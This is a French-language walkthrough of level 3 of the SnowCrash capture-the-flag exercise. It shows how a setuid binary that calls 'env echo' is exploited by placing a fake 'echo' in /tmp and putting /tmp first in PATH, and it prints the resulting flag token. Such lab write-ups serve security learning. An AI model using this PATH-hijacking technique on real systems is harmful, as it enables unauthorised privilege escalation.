# Level03

## Observations

Pour ce level, on se retrouve avec un fichier executable dans le home directory,
`level03`.

En effectuant un `ls -l` sur ce fichier, on s'aperçoit de deux choses:
Premièrement, le propriétaire du fichier est `flag03`, le groupe `level03` (càd, moi, cf la commande `id`).
Deuxièmement, si l'on s'interesse aux permissions, on s'aperçoit que nous (le groupe)
avons les permissions suivantes `r-s`:
- Permission de lecture `r`
- Et plus intéressant un `s`, qui d'après [cette page](https://tech.feub.net/2008/03/setuid-setgid-et-sticky-bit/),
nous permet de ne pas executer le programme en tant que nous (user: level03), mais en
tant que propriétaire (flag03).

A ce stade, il faut noter que depuis le début nous obtenons le flag après nous être connecté
à l'utilisateur `flagXX`, avec la commande `getflag`.

En l'executant, on obtient:
```sh
level03@SnowCrash:~$ ./level03
Exploit me
```

Ainsi, soit-il observons son contenu avec la commande `strings`:
```sh
strings ./level03
```

> La commande `strings` nous permet de lire rapidement le contenu "lisible" d'un binaire.

En effectuant cette commande, nous remarquons la ligne suivante:
```
/usr/bin/env echo Exploit me
```

## Résolution
Je peux essayer de changer le comportement de la commande précédente,
J'ai dans un premier temps essayer d'editer la ligne directement.
Impossible nous n'avons pas les droits d'ecriture.

On pourrait penser aux alias dans un premier temps, or ces derniers sont spécifiques
à l'utilisateur, or ce programme est lancé avec l'utilisateur `flag03`.

Enfin je peux essayer de lancer la commande avec un environnement différent, en modifiant
le path pour que ce ne soit pas la commande `echo` par défaut qui soit executé, mais getflag.
Pour faire cela, j'utiliserai la commande `env`.

Dans un premier temps, je vérifie les paths de `echo` et `getflag`:
```sh
level03@SnowCrash:~$ which echo getflag
/bin/echo
/bin/getflag
```

> On remarque que les deux commandes sont situés sous `/bin`. On ne pourra donc
> pas se débarrasser simplement de `/bin` dans la variable d'environnement `PATH`.

Il faut ensuite créer un fichier executable contenant la commande getflag.
Il nous est impossible de créer un fichier dans le home directory (pas la permissions).
En faisant `ls -l /`, on remarque plusieurs dossiers dans lesquels nous pouvons
écrire. Je choisis `/tmp` par habitude. Ainsi:

```sh
level03@SnowCrash:~$ cat > /tmp/echo
getflag
level03@SnowCrash:~$ chmod 777 /tmp/echo
```

> On note que j'appelle mon fichier `echo` et que je lui donne toutes les permissions.
> On peut vérifier que ça marche bien en comparant les sorties de `getflag` et `/tmp/echo`

Je peux ensuite lancé le binaire avec une variable PATH modifié:
> `/tmp` devra être placé en premier dans notre variable
```sh
env PATH=/tmp:/bin ./level03
```

ou:
```sh
env PATH="/tmp:$PATH" ./level03
```

Dans les deux cas on a la même sortie:
```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

On a notre flag, pour acceder au level suivant :)
